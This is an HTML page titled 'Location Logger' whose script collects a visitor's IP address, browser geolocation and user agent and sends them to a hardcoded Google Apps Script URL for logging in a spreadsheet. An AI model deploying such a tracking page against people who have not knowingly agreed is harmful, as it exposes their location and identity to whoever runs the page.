<!DOCTYPE html>
<html>
<head>
  <title>Location Logger</title>
</head>
<body>
  <h2>Capturing your details...</h2>

  <script>
    const scriptURL = "https://script.google.com/macros/s/AKfycbxEgNUCEp1mlfvi0_tKItOHHkSHLA0HeCMovNHUyc0Fc35FPfBmmfE46k1DCEcsl2fo/exec"; // üëà replace with your Google Apps Script Web App URL

    // Get device/browser info
    const deviceInfo = navigator.userAgent;

    // Get IP address from external API
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ipAddress = ipData.ip;

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            position => {
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;

              // Send all data to Google Sheets
              fetch(`${scriptURL}?lat=${latitude}&lng=${longitude}&ip=${ipAddress}&device=${encodeURIComponent(deviceInfo)}`)
                .then(() => {
                  document.body.innerHTML = `
                    <h2>‚úÖ Details Captured!</h2>
                    <h3>Location:</h3>
                    <p>Latitude: ${latitude}</p>
                    <p>Longitude: ${longitude}</p>
                    <h3>Network:</h3>
                    <p>IP Address: ${ipAddress}</p>
                    <h3>Device Info:</h3>
                    <p>${deviceInfo}</p>
                  `;
                });
            },
            () => {
              document.body.innerHTML = "‚ùå Unable to retrieve your location.";
            }
          );
        } else {
          document.body.innerHTML = "‚ùå Geolocation not supported.";
        }
      });
  </script>
</body>
</html>

